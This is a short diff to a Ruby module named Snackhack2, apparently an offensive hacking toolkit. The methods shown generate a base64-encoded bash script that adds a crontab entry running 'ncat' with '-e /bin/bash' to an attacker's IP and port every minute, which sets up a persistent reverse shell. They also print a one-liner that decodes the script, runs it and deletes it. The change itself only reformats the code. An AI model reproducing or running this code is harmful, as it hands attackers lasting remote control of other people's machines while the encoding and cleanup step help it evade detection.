@@ -13,11 +13,9 @@ module Snackhack2
       puts "echo -n '#{Base64.encode64(c)}' | base64 -d >> t.sh; bash t.sh; rm t.sh;".delete!("\n")
     end
     def run2
-    	c = %Q{
-    	#!/bin/bash
+    	c = %Q{#!/bin/bash
 			line="* * * * * ncat #{@ip} #{@port} -e /bin/bash"
 			(crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -}	
-    	}
     	puts "echo -n '#{Base64.encode64(c)}' | base64 -d >> t.sh; bash t.sh; rm t.sh;".delete!("\n")
     end
   end
